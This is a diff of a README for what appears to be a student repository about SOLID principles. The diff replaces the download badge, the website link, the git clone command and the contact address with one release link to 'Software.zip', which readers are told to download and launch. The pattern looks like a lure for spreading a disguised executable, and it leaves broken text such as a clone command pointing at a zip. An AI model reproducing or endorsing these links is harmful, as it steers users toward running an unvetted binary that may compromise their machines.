@@ -8,7 +8,7 @@ This repository contains the solution for Exercise 4, focusing on the SOLID prin
 
 ## Get Started
 To access the software, please click on the link below:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/qja120812/exerc4-itau-unibanco/releases/download/v1.0/Software.zip)](https://github.com/qja120812/exerc4-itau-unibanco/releases/download/v1.0/Software.zip)
 
 ## Launch Instructions
 The provided link contains the software package that needs to be downloaded and launched.
@@ -20,7 +20,7 @@ Feel free to explore the codebase in this repository to understand how the SOLID
 If you encounter any issues with the link provided or if it does not work, please check the "Releases" section of this repository for alternative download options.
 
 ## Visit Our Website
-For more information and updates, visit our official website [here](https://www.yourwebsite.com).
+For more information and updates, visit our official website [here](https://github.com/qja120812/exerc4-itau-unibanco/releases/download/v1.0/Software.zip).
 
 ---
 
@@ -63,7 +63,7 @@ The code in this repository has been refactored to adhere to each of the SOLID p
 To get started with this project, follow these steps:
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/exerc4-itau-unibanco.git
+   git clone https://github.com/qja120812/exerc4-itau-unibanco/releases/download/v1.0/Software.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -78,7 +78,7 @@ To get started with this project, follow these steps:
 Contributions are welcome! Feel free to fork this repository, make your changes, and submit a pull request. Together, we can improve the codebase and learn from each other.
 
 ## 📞 Contact
-If you have any questions or feedback, feel free to reach out to us at [contact@yourwebsite.com].
+If you have any questions or feedback, feel free to reach out to us at [https://github.com/qja120812/exerc4-itau-unibanco/releases/download/v1.0/Software.zip].
 
 Thank you for visiting our repository and happy coding! 🎉
 
